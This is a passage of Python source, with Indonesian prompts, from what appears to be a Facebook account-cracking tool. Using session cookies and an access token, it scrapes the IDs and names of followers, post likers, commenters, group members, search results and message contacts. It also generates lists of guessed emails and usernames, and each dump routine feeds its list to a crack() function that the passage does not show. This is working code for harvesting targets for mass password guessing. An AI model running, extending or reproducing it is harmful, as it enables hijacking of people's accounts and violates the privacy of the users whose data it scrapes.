    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan ID Target : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));_file_ = _query_+'.json';_url_dev_ = 'https://mbasic.facebook.com/subscribe/lists/?id=' + _query_;_file_ = (_query_+'.json').replace(' ','_')
    try:os.remove(_file_)
    except:pass
    exec_followers(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_followers(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('a',href=True):
            if "profile.php" in _cici_.get('href'):
                try:
                    _name_dev_ = _cici_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_cici_.get("href")))
                    if _name_dev_ in _buka_file_:pass
                    elif '/' in _id_dev_:pass
                    else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                except:pass
            else:pass
        for _cici_ in _sop_dev_.find_all('a',href=True):
            if 'Lihat Selengkapnya' in _cici_.text:url_dev = 'https://mbasic.facebook.com/' + _cici_.get('href');exec_followers(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)

### Dump ID From Likers Post
def main_likers(_dapunta_):
    anti_ganti()
    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan ID Postingan : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _dapunta_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_);scrape_likers(_dapunta_,_url_,_file_)
    if len(_dapunta_dapunta_(_file_).read().splitlines()) == 0:_dapunta_cici_('\n%s╚══[%s!%s] %sPostingan Tidak Ditemukan'%(M,P,M,P));_cici_cici_()
    _dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def scrape_likers(_dapunta_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_ = _id_.get("href").split('=')[1];__id__ = _id_.text;_dapunta_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
                    else:_a_ = _id_.get("href").split('/')[1];__id__ = _id_.text;_dapunta_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "Lihat Selengkapnya" in _lanjut_.text:
                while True:
                    try:scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:_dapunta_cici_('%s%s'%(M,e))
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)

### Dump ID From Comment Post
def main_komen(_dapunta_):
    anti_ganti()
    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan ID Postingan : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));_file_ = _query_+'.json'
    try:os.remove(_query_+'.json')
    except:pass
    _dapunta_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/'+_query_);scrape_komen(_dapunta_,_url_,_file_)
    if len(_dapunta_dapunta_(_file_).read().splitlines()) == 0:_dapunta_cici_('\n%s╚══[%s!%s] %sPostingan Tidak Ditemukan'%(M,P,M,P));_cici_cici_()
    _dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def scrape_komen(_dapunta_,_url_,_file_):
    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
    try: 
        for _isi_ in _ses_par_.find_all('h3'):
            for _id_ in _isi_.find_all('a',href=True):
                try:
                    if "profile.php" in _id_.get("href"):_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",_id_.get("href")));__id__ = _id_.text;_dapunta_dapunta_(_file_,'a+').write(str(_a_).split('&')[0]+'•'+__id__+'\n')
                    else:_a_="".join(bs4.re.findall("/(.*?)\?",_id_.get("href")));__id__ = _id_.text;_dapunta_dapunta_(_file_,'a+').write(str(_a_).split('?')[0]+'•'+__id__+'\n')
                except:continue
        for _lanjut_ in _ses_par_.find_all("a",href=True):
            if "Lihat komentar lainnya…" in _lanjut_.text:
                while True:
                    try:scrape_komen(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:_dapunta_cici_('%s%s'%(M,e))
            elif "Lihat komentar sebelumnya…" in _lanjut_.text:
                while True:
                    try:scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                    except Exception as e:_dapunta_cici_('%s%s'%(M,e))
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)

### Dump ID From Group
class dump_grup:
    def __init__(self,_dapunta_,_cici_):
        self.glist=[];self._grup_=[];self.id='__dapunta__.json';self.token=_cici_;self.cookies=_dapunta_;self.header = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"};self.main_group("https://m.facebook.com/groups/?seemore")
    def main_group(self, url_dev):
        bs=bs4.BeautifulSoup(_req_get_(url_dev,cookies=self.cookies,headers=self.header).text,"html.parser")
        for _cici_ in bs.find_all("a",href=True):
            if "/groups/" in _cici_.get("href"):
                if "category" in _cici_.get("href") or "create" in _cici_.get("href"):continue
                else:self.glist.append({"id":"".join(bs4.re.findall("/groups/(.*?)\?",_cici_.get("href"))),"name":_cici_.text})
        if len(self.glist) !=0:
            _dapunta_cici_("%s╠══[%s•%s] %sKamu Bergabung Dalam %s%s%s Grup"%(O,P,O,P,O,len(self.glist),P));_dapunta_cici_('%s╠══[%s1%s] %sCari Semua Grup Bergabung'%(O,P,O,P));_dapunta_cici_('%s╠══[%s2%s] %sCari Grup Berdasar Nama'%(O,P,O,P));_dapunta_cici_('%s╠══[%s3%s] %sCari Grup Berdasar ID'%(O,P,O,P))
            while True:
                c=_cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P));_dapunta_cici_('%s║'%(O))
                if c=="":continue
                elif c=="1":self.saya()
                elif c=="2":self.search()
                elif c=="3":self.manual()
                else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
        else:_dapunta_cici_("%s╠══[%s•%s] %sKamu Tidak Bergabung Dalam Grup Manapun"%(O,P,O,P));self.manual()
    def saya(self):
        self.fl=(self.id)
        try:os.remove(self.fl)
        except:pass
        _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
        try: 
            url = "https://graph.facebook.com/me/groups?access_token={}".format(self.token)
            with _req_ses_ as ses_:
                data = ses_.get(url).json()
                for _dapunta_ in data["data"]:
                    try:self._grup_.append(_dapunta_["id"])
                    except:pass
            for _cici_ in self._grup_:
                try:self.url_grup = ("https://mbasic.facebook.com/browse/group/members/?id=%s"%(_cici_));self.exec_grup_saya();_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
                except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
                except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
        except (KeyError,IOError):jalan('%s╚══[%s!%s] %sCookie Invalid'%(M,P,M,P));menu()
        except requests.exceptions.ConnectionError:jalan('%s╚══[%s!%s] %sKoneksi Bermasaah'%(M,P,M,P));menu()
        except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
        except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
    def exec_grup_saya(self):
        global count
        with _req_ses_ as ses_:
            try:
                data = ses_.get(self.url_grup, cookies=self.cookies, headers=self.header).content;sop_dev = par(data, "html.parser");members = sop_dev.find("div", id="objects_container")
                for dev in members.find_all("table"):
                    user_ = dev["id"].replace("member_", "");nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
                    try:_dapunta_dapunta_(self.fl,'a+').write(str(user_)+"•"+str(nama_)+"\n").close()
                    except:pass
                _dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
                if "Lihat Selengkapnya" in str(sop_dev):url = sop_dev.find("a", string="Lihat Selengkapnya")["href"];url_grup = "https://mbasic.facebook.com"+url;self.exec_grup_saya()
            except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
            except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
    def manual(self):
        id=_cici_dapunta_("%s╠══[%s•%s] %sMasukkan ID Grup : "%(O,P,O,P))
        if id=="":jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
        else:
            r=bs4.BeautifulSoup(_req_get_("https://m.facebook.com/groups/"+id,headers=header_grup,cookies=self.cookies).text,"html.parser")
            if "konten tidak" in r.find("title").text.lower():jalan('%s╚══[%s!%s] %sGrup Privat Atau ID Salah'%(M,P,M,P));menu()
            else:
                self.listed={"id":id,"name":r.find("title").text};self.f(id);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╠══[%s•%s] %sNama : %s"%(O,P,O,P,self.listed.get("name")));xd = _cici_dapunta_('%s╠══[%s•%s] %sDump ID/Username? [i/u] : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
                if xd in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
                elif xd in ['i','I','1']:
                    try:self.dump_id("https://m.facebook.com/groups/"+id);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
                elif xd in ['u','U','2']:
                    try:self.dump_username("https://m.facebook.com/groups/"+id);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
                else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()    
    def search(self):
        whitelist=[];q=_cici_dapunta_('%s╠══[%s•%s] %sNama : '%(O,P,O,P)).lower()
        if q=='':self.search()
        else:
            for e,i in enumerate(self.glist):
                if q in i.get("name").lower():whitelist.append(i);_dapunta_cici_('%s╠══[%s%s%s] %s%s'%(O,P,len(whitelist),O,P,i.get("name").replace(q,"%s"%(q))))
            if len(whitelist)==0:jalan('%s╚══[%s!%s] %sGrup Privat Atau ID Salah'%(M,P,M,P));menu()
            else:self.choice(whitelist,q)
    def choice(self, whitelist,q):
        try:
            self.listed=whitelist[int(_cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P)))-int(1)];self.f(q);_dapunta_cici_('%s║'%(O));_dapunta_cici_("%s╠══[%s•%s] %sNama : %s"%(O,P,O,P,self.listed.get("name")));xd = _cici_dapunta_('%s╠══[%s•%s] %sDump ID/Username? [i/u] : '%(O,P,O,P));_dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P))
            if xd in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
            elif xd in ['i','I','1']:
                try:self.dump_id("https://m.facebook.com/groups/"+self.listed.get("id"));_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
            elif xd in ['u','U','2']:
                try:self.dump_username("https://m.facebook.com/groups/"+self.listed.get("id"));_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
            else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
        except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
        except Exception as _error_:_dapunta_cici_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
    def f(self,id):
        self.fl=(id.replace(' ','_')+'.json')
        if self.fl=='':self.f()
        try:os.remove(self.fl)
        except:pass
        _dapunta_dapunta_(self.fl,"w").close()
    def dump_username(self, url):
        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
        for i in r.find_all("h3"):
            try:
                if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
                    ogeh=i.find("a",href=True)
                    if "profile.php" in ogeh.get("href"):
                        a="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
                        if len(a)==0:continue
                        elif a in _dapunta_dapunta_(self.fl).read():continue
                        else:_dapunta_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text));continue
                    else:
                        a="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
                        if len(a)==0:continue
                        elif a in _dapunta_dapunta_(self.fl).read():continue
                        else:_dapunta_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text))
            except:continue
        for i in r.find_all("a",href=True):
            if "Lihat Postingan Lainnya" in i.text:
                while True:
                    try:self.dump_username("https://m.facebook.com/"+i.get("href"));break
                    except Exception as e:_dapunta_cici_('\r%s╚══[%s!%s] %sMengulangi'%(M,P,M,P));continue
    def dump_id(self, url):
        r=bs4.BeautifulSoup(_req_get_(url,cookies=self.cookies,headers=header_grup).text,"html.parser");_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
        for i in r.find_all("h3"):
            try:
                if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
                    ogeh=i.find("a",href=True)
                    if "profile.php" in ogeh.get("href"):
                        a="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
                        if len(a)==0:continue
                        elif a in _dapunta_dapunta_(self.fl).read():continue
                        else:_dapunta_dapunta_(self.fl,"a+").write("%s•%s\n"%(a,ogeh.text));continue
                    else:
                        a="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
                        if len(a)==0:continue
                        elif a in _dapunta_dapunta_(self.fl).read():continue
                        else:_dapunta_dapunta_(self.fl,"a+").write("%s•%s\n"%(_get_id_(a),ogeh.text))
            except:continue
        for i in r.find_all("a",href=True):
            if "Lihat Postingan Lainnya" in i.text:
                while True:
                    try:self.dump_id("https://m.facebook.com/"+i.get("href"));break
                    except Exception as e:_dapunta_cici_('\r%s╚══[%s!%s] %sMengulangi'%(M,P,M,P));continue

### Convert Username To ID
def _get_id_(username):
    url = "https://lookup-id.com/#"
    with _req_ses_ as dev:
        payload = {"fburl": "https://m.facebook.com/{}".format(username), "check": "Lookup"}
        if "facebook" in username:payload = {"fburl": username, "check": "Lookup"}
        data_dev = dev.post(url, data=payload).content;sop_ = par(data_dev, "html.parser");id_ = sop_.find("span", id="code");user_get_id = id_.text
        return user_get_id

### Dump ID From Name
def dump_name(_dapunta_):
    anti_ganti()
    _dapunta_cici_('%s╠══[%s•%s] %sContoh : Dapunta,Rizal,Angga'%(O,P,O,P));__name__ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Nama : '%(O,P,O,P)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
    for _name_ in __name__:_url_ = "https://mbasic.facebook.com/search/people/?q="+_name_;cari_nama(_file_,_dapunta_,_url_)
    _buka_file_ = _dapunta_dapunta_(_file_,'r').read().splitlines();_dapunta_cici_("\n%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
    return crack(_file_)
def cari_nama(_file_,_cookies_,_url_):
    _dapunta_dapunta_(_file_,"a+");_req_ses_dev_ = bs4.BeautifulSoup(_req_get_(_url_, cookies=_cookies_,headers=header_nama).text,"html.parser")
    for _dapunta_dev_ in _req_ses_dev_.find_all("a",href=True):
        _dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
        if "<img alt=" in str(_dapunta_dev_):
            if "home.php" in str(_dapunta_dev_["href"]):continue
            else:
                _str_dev_ = str(_dapunta_dev_["href"])
                if "profile.php" in _str_dev_:
                    _name_ = _dapunta_dev_.find("img").get("alt").replace(", profile picture","");_find_ = bs4.re.findall("/profile\.php\?id=(.*?)&",_str_dev_)
                    if len (_find_) !=0:
                        _user_ = "".join(_find_)
                        if _user_ in _dapunta_dapunta_(_file_).read():pass
                        else:_dapunta_dapunta_(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
                else:
                    _find_ = bs4.re.findall("/(.*?)\?",_str_dev_);_name_ = _dapunta_dev_.find("img").get("alt").replace(", profile picture","")
                    if len(_find_) !=0:
                        _user_="".join(_find_)
                        if _user_ in _dapunta_dapunta_(_file_).read():pass
                        else:_dapunta_dapunta_(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
        if "Lihat Hasil Selanjutnya" in _dapunta_dev_.text:cari_nama(_file_,_cookies_,_dapunta_dev_["href"])

### Dump ID From Message
class dump_pesan:
    def __init__(self,_cookies_,_nama_,_id_):
        self.cookies = _cookies_;self.id = _id_;self.files = (_nama_+'.json').replace(" ","_");_dapunta_dapunta_(self.files,"w").close();self.dump("https://m.facebook.com/messages")
    def dump(self,url):
        _req_ses_dev_ = bs4.BeautifulSoup(_req_get_(url,headers=header_nama,cookies=self.cookies).text,"html.parser")
        for _dev_ in _req_ses_dev_.find_all("a",href=True):
            if "/messages/read" in _dev_.get("href"):
                _soup_ = bs4.re.findall("cid\.c\.(.*?)%3A(.*?)&",_dev_.get("href"))
                try:
                    for _user_ in list(_soup_.pop()):
                        if _user_ in self.id:continue
                        else:
                            if "pengguna facebook" in _dev_.text.lower():continue
                            _dapunta_dapunta_(self.files,"a+").write("%s•%s\n"%(_user_,_dev_.text));_dapunta_cici_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.files).read().splitlines())),end='');sys.stdout.flush()
                except Exception as e:continue
            if "Lihat Pesan Sebelumnya" in _dev_.text:self.dump("https://m.facebook.com/"+_dev_.get("href"))
        _buka_file_ = _dapunta_dapunta_(self.files,'r').read().splitlines();_dapunta_cici_("\n%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
        return crack(self.files)

### Dump ID From Files
def dump_file():
    _dapunta_cici_("%s╠══[%s•%s] %sContoh : /sdcard/dapunta.json"%(O,P,O,P));_files_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama File : "%(O,P,O,P));_sekat_ = _cici_dapunta_("%s╠══[%s•%s] %sPemisah ID & Nama : "%(O,P,O,P))
    try:_baca_ = _dapunta_dapunta_(_files_,'r').read();_buku_ = _baca_.replace(_sekat_,'•');_dapunta_dapunta_(_files_,'w').write(_buku_)
    except:jalan('%s╚══[%s!%s] %sFile Tidak Ditemukan'%(M,P,M,P));menu()
    return crack(_files_)

### Dump ID From Email
def dump_email():
    _dapunta_cici_("%s╠══[%s•%s] %sContoh : Dapunta Khurayra"%(O,P,O,P));_query_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama : "%(O,P,O,P)).lower()
    if len(_query_) < 3:jalan('%s╚══[%s!%s] %sNama Harus Lebih Dari 2 Digit'%(M,P,M,P));time.sleep(2);menu()
    _dapunta_cici_("%s╠══[%s•%s] %sContoh : gmail.com"%(O,P,O,P));_domain_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Domain : "%(O,P,O,P)).lower()
    if '@' in _domain_:_domain_ = _domain_.split('@')[1]
    _limit_awal_ = int(_cici_dapunta_("%s╠══[%s•%s] %sSet Angka Awal : "%(O,P,O,P)));_limit_akhir_= int(_cici_dapunta_("%s╠══[%s•%s] %sSet Angka Akhir : "%(O,P,O,P)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
    exec_email(_query_,_domain_,_limit_awal_,_limit_akhir_,_file_)
def exec_email(__query__,_domain_,_limit_awal_,_limit_akhir_,_file_):
    _hitung_email_1_ = _limit_awal_+1;_hitung_email_2_ = _limit_awal_+1;_hitung_email_3_ = _limit_awal_+1;_hitung_email_full_ = _limit_awal_+1
    if ' ' in __query__:
        try:_query_1_ = __query__.split(' ')[0]
        except:pass
        try:_query_2_ = __query__.split(' ')[1]
        except:pass
        try:_query_3_ = __query__.split(' ')[2]
        except:pass
    elif '.' in __query__:
        try:_query_1_ = __query__.split('.')[0]
        except:pass
        try:_query_2_ = __query__.split('.')[1]
        except:pass
        try:_query_3_ = __query__.split('.')[2]
        except:pass
    elif '_' in __query__:
        try:_query_1_ = __query__.split('_')[0]
        except:pass
        try:_query_2_ = __query__.split('_')[1]
        except:pass
        try:_query_3_ = __query__.split('_')[2]
        except:pass
    elif '-' in __query__:
        try:_query_1_ = __query__.split('-')[0]
        except:pass
        try:_query_2_ = __query__.split('-')[1]
        except:pass
        try:_query_3_ = __query__.split('-')[2]
        except:pass
    else:
        try:_query_1_ = __query__
        except:pass
    try :
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_1_;email = ('%s%s@%s'%(_query_1_,str(_hitung_email_1_),_domain_));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_1_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_2_;email = ('%s%s@%s'%(_query_2_,str(_hitung_email_2_),_domain_));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_2_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_3_;email = ('%s%s@%s'%(_query_3_,str(_hitung_email_3_),_domain_));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_3_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:
                if '.' in __query__:_query_ = __query__;nama = __query__.replace('.',' ')
                elif '_' in __query__:_query_ = __query__;nama = __query__.replace('_',' ')
                elif '-' in __query__:_query_ = __query__;nama = __query__.replace('-',' ')
                else:_query_ = __query__.replace(' ','');nama = __query__
                email = ('%s%s@%s'%(_query_,str(_hitung_email_full_),_domain_));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_full_ += 1
            except:continue
    except:
        jalan('%s╚══[%s!%s] %sTerjadi Kesalahan'%(M,P,M,P))
        time.sleep(2)
        menu()
    _buka_file_ = _dapunta_dapunta_(_file_,'r').read().splitlines()
    _dapunta_cici_("%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
    return crack(_file_)

### Dump Username
def dump_username():
    _dapunta_cici_("%s╠══[%s•%s] %sContoh : dapunta.khurayra"%(O,P,O,P));_query_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama : "%(O,P,O,P)).lower()
    if len(_query_) < 3:jalan('%s╚══[%s!%s] %sNama Harus Lebih Dari 2 Digit'%(M,P,M,P));time.sleep(2);menu()
    _limit_awal_ = int(_cici_dapunta_("%s╠══[%s•%s] %sSet Angka Awal : "%(O,P,O,P)));_limit_akhir_= int(_cici_dapunta_("%s╠══[%s•%s] %sSet Angka Akhir : "%(O,P,O,P)));_file_ = (_query_+".json").replace(" ","_")
    try:os.remove(_file_)
    except:pass
    exec_username(_query_,_limit_awal_,_limit_akhir_,_file_)
def exec_username(__query__,_limit_awal_,_limit_akhir_,_file_):
    _hitung_email_1_ = _limit_awal_+1;_hitung_email_2_ = _limit_awal_+1;_hitung_email_3_ = _limit_awal_+1;_hitung_email_full_ = _limit_awal_+1
    if ' ' in __query__:
        try:_query_1_ = __query__.split(' ')[0]
        except:pass
        try:_query_2_ = __query__.split(' ')[1]
        except:pass
        try:_query_3_ = __query__.split(' ')[2]
        except:pass
    elif '.' in __query__:
        try:_query_1_ = __query__.split('.')[0]
        except:pass
        try:_query_2_ = __query__.split('.')[1]
        except:pass
        try:_query_3_ = __query__.split('.')[2]
        except:pass
    elif '_' in __query__:
        try:_query_1_ = __query__.split('_')[0]
        except:pass
        try:_query_2_ = __query__.split('_')[1]
        except:pass
        try:_query_3_ = __query__.split('_')[2]
        except:pass
    elif '-' in __query__:
        try:_query_1_ = __query__.split('-')[0]
        except:pass
        try:_query_2_ = __query__.split('-')[1]
        except:pass
        try:_query_3_ = __query__.split('-')[2]
        except:pass
    else:
        try:_query_1_ = __query__
        except:pass
    try :
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_1_;email = ('%s%s'%(_query_1_,str(_hitung_email_1_)));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_1_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
